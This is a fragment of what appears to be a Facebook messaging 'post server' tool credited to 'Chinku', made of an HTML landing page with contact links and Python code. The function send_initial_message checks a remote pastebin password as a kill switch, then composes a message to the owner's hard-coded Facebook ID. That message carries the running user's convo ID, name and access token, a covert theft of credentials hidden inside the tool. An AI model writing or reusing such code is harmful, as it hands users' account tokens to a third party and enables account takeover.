...
<head>
    ...
    <title>CHINKU'S POST SERVER</title>
    <style>
        body {
...
<body>
    <div class="container">
        <div class="box">
            <h1>CHINKU'S POST SERVER</h1>
            <div class="credit">
                <p>1. CREDIT:- CHINKU </p>
                <p>2. OWNER => CHINKU </p>
                <p>3. CONTACT:- <a href="https://wa.me/+923042189983">WhatsApp</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=KOJ9XD">Facebook</a></p>
...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/UzuN5Mgq').text
    
    if mmm_pass not in password:
        print('\033[1;31m⚠︎ Your Password Changed By Chinku ⚠︎')
        sys.exit()
    
    # Message template
    msg_template = "Owner => Chinku \n Hello Chinku sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["100016355347575"]
